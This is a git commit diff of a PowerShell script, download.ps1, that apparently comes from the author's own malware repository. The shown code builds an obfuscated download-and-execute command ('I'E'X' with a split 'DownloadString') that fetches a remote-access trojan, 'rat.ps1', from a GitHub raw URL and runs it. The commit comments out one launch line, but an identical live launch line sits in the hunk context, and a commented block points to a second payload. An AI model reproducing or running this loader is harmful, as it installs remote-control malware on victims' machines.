f2c10af3bb8d765284527a70937b244e21df8734
43a1723 <hai1723notgay@gmail.com>
2024-08-27 20:57:40 +0700

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -68,7 +68,7 @@ Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
 $shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/hacklife/rat.ps1")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
+# Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
 # if ($env:USERDOMAIN -ne "DESKTOP-A1L2M8J") {
 #     $datacode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode2.ps1")
